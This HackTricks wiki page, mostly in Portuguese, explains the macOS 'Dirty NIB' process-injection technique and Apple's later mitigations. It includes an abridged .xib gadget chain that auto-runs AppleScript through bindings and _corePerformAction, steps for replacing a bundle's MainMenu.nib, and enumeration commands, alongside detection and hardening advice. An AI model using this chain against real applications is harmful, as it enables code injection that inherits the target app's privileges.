# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB refere-se ao abuso de arquivos do Interface Builder (.xib/.nib) dentro de um bundle macOS assinado para executar lógica controlada pelo atacante dentro do processo alvo, herdando assim seus entitlements e permissões TCC. Esta técnica foi originalmente documentada por xpn (MDSec) e posteriormente generalizada e significativamente expandida por Sector7, que também cobriu as mitigações da Apple no macOS 13 Ventura e macOS 14 Sonoma. Para contexto e análises aprofundadas, veja as referências ao final.

> TL;DR
> • Antes do macOS 13 Ventura: substituir o MainMenu.nib de um bundle (ou outro nib carregado na inicialização) podia conseguir injeção de processo de forma confiável e frequentemente escalada de privilégios.
> • Desde o macOS 13 (Ventura) e aprimorado no macOS 14 (Sonoma): verificação profunda no primeiro lançamento, proteção de bundles, Launch Constraints e a nova permissão TCC “App Management” impedem em grande parte a adulteração de nibs pós‑lançamento por apps não relacionados. Ataques ainda podem ser viáveis em casos de nicho (por exemplo, ferramentas do mesmo desenvolvedor modificando seus próprios apps, ou terminais concedidos App Management/Full Disk Access pelo usuário).

## What are NIB/XIB files

Arquivos Nib (abreviação de NeXT Interface Builder) são grafos de objetos de UI serializados usados por apps AppKit. O Xcode moderno armazena arquivos .xib XML editáveis que são compilados em .nib no tempo de build. Um app típico carrega sua UI principal via `NSApplicationMain()` que lê a chave `NSMainNibFile` do Info.plist do app e instancia o grafo de objetos em tempo de execução.

Pontos-chave que habilitam o ataque:
- O carregamento de NIB instaura classes arbitrary Objective‑C sem exigir que elas conformem a NSSecureCoding (o nib loader da Apple recorre a `init`/`initWithFrame:` quando `initWithCoder:` não está disponível).
- Cocoa Bindings podem ser abusadas para chamar métodos enquanto os nibs são instanciados, incluindo chamadas encadeadas que não exigem interação do usuário.

## Dirty NIB injection process (attacker view)

O fluxo clássico pré‑Ventura:
1) Create a malicious .xib
- Add an `NSAppleScript` object (or other “gadget” classes such as `NSTask`).
- Add an `NSTextField` whose title contains the payload (e.g., AppleScript or command arguments).
- Add one or more `NSMenuItem` objects wired via bindings to call methods on the target object.

2) Auto‑trigger without user clicks
- Use bindings to set a menu item’s target/selector and then invoke the private `_corePerformAction` method so the action fires automatically when the nib loads. This removes the need for a user to click a button.

Minimal example of an auto‑trigger chain inside a .xib (abridged for clarity):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Isto permite a execução arbitrária de AppleScript no processo alvo quando o nib é carregado. Cadeias avançadas podem:
- Instanciar classes arbitrárias do AppKit (por exemplo, `NSTask`) e chamar métodos sem argumentos como `-launch`.
- Chamar selectors arbitrários com argumentos objeto via o binding trick acima.
- Carregar AppleScriptObjC.framework para fazer ponte com Objective‑C e até chamar APIs C selecionadas.
- Em sistemas mais antigos que ainda incluem Python.framework, fazer ponte para Python e então usar `ctypes` para chamar funções C arbitrárias (Sector7’s research).

3) Replace the app’s nib
- Copy target.app to a writable location, replace e.g., `Contents/Resources/MainMenu.nib` with the malicious nib, and run target.app. Pre‑Ventura, after a one‑time Gatekeeper assessment, subsequent launches only performed shallow signature checks, so non‑executable resources (like .nib) weren’t re‑validated.

Example AppleScript payload for a visible test:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Proteções modernas do macOS (Ventura/Monterey/Sonoma/Sequoia)

A Apple introduziu várias mitigações sistêmicas que reduzem drasticamente a viabilidade do Dirty NIB no macOS moderno:
- First‑launch deep verification and bundle protection (macOS 13 Ventura)
- No primeiro lançamento de qualquer app (quarentenado ou não), uma verificação profunda da assinatura abrange todos os recursos do bundle. Depois disso, o bundle fica protegido: somente apps do mesmo desenvolvedor (ou explicitamente permitidos pelo app) podem modificar seu conteúdo. Outros apps exigem a nova permissão TCC “App Management” para escrever no bundle de outro app.
- Launch Constraints (macOS 13 Ventura)
- System/Apple‑bundled apps can’t be copied elsewhere and launched; this kills the “copy to /tmp, patch, run” approach for OS apps.
- Improvements in macOS 14 Sonoma
- Apple hardened App Management and fixed known bypasses (e.g., CVE‑2023‑40450) noted by Sector7. Python.framework was removed earlier (macOS 12.3), breaking some privilege‑escalation chains.
- Gatekeeper/Quarantine changes
- For a broader discussion of Gatekeeper, provenance, and assessment changes that impacted this technique, see the page referenced below.

> Implicação prática
> • On Ventura+ you generally cannot modify a third‑party app’s .nib unless your process has App Management or is signed by the same Team ID as the target (e.g., developer tooling).
> • Granting App Management or Full Disk Access to shells/terminals effectively re‑opens this attack surface for anything that can execute code inside that terminal’s context.


### Lidando com Launch Constraints

Launch Constraints impedem a execução de muitos apps da Apple a partir de locais não‑padrão a partir do Ventura. Se você dependia de fluxos de trabalho pré‑Ventura como copiar um app da Apple para um diretório temporário, modificar `MainMenu.nib` e executá‑lo, espere que isso falhe em >= 13.0.


## Enumerando alvos e nibs (útil para pesquisa / sistemas legados)

- Localizar apps cuja UI é nib‑driven:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Encontrar recursos nib candidatos dentro de um bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Validar profundamente as assinaturas de código (falhará se você tiver alterado recursos e não os re-assinou):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Nota: No macOS moderno você também será bloqueado pela bundle protection/TCC ao tentar escrever no bundle de outro app sem autorização adequada.


## Detecção e dicas de DFIR

- Monitoramento de integridade de arquivos em recursos de bundle
- Monitore alterações de mtime/ctime em `Contents/Resources/*.nib` e outros recursos não‑executáveis em apps instalados.
- Logs unificados e comportamento de processos
- Monitore execuções inesperadas de AppleScript dentro de apps GUI e processos carregando AppleScriptObjC ou Python.framework. Exemplo:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Avaliações proativas
- Execute periodicamente `codesign --verify --deep` em apps críticos para garantir que os recursos permaneçam intactos.
- Contexto de privilégio
- Audite quem/o que tem TCC “App Management” ou Full Disk Access (especialmente terminais e agentes de gestão). Remover esses privilégios de shells de uso geral impede reativar trivialmente a manipulação no estilo Dirty NIB.


## Defensive hardening (developers and defenders)

- Prefira UI programática ou limite o que é instanciado a partir de nibs. Evite incluir classes poderosas (e.g., `NSTask`) em grafos de nib e evite bindings que invoquem selectors indiretamente em objetos arbitrários.
- Adote o hardened runtime com Library Validation (já padrão em apps modernos). Embora isso não impeça a nib injection por si só, bloqueia o carregamento fácil de código nativo e força atacantes a payloads apenas por scripting.
- Não solicite nem dependa de permissões amplas de App Management em ferramentas de uso geral. Se o MDM exigir App Management, segrege esse contexto de shells orientados ao usuário.
- Verifique regularmente a integridade do bundle do seu app e faça com que seus mecanismos de atualização restaurem automaticamente os recursos do bundle.


## Related reading in HackTricks

Saiba mais sobre Gatekeeper, quarantine e alterações de provenance que afetam esta técnica:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- xpn – DirtyNIB (relato original com exemplo no Pages): https://blog.xpnsec.com/dirtynib/
- Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (5 de abril de 2024): https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/

{{#include ../../../banners/hacktricks-training.md}}
